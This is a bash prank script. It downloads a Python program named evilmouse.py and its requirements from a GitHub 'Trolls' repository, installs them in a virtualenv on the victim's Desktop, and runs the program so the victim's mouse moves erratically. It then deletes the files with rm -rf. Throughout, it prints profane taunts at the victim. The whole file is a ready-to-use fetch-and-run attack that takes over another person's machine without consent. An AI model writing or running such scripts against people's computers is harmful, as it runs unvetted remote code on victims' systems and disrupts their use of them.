#! /usr/bin/bash

echo "Fuck your life. You will be running evilmouse in a minny"
cd "$HOME/Desktop"
mkdir evilmouse
cd evilmouse
wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/evilmouse.py
wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/requirements.txt
pip install virtualenv
virtualenv venv
. venv/bin/activate
pip install -r requirements.txt
echo ""
echo ""
echo "Trolling you now. You're fucked for a while. Your mouse will go crazy."
echo ""
echo ""
python evilmouse.py
#pip3 uninstall -r requirements.txt
cd ".."
rm -rf evilmouse
echo ""
echo ""
echo "You have been trolled."
echo "Done pranking and uninstalling the script and removing everything else."
echo ""
echo ""
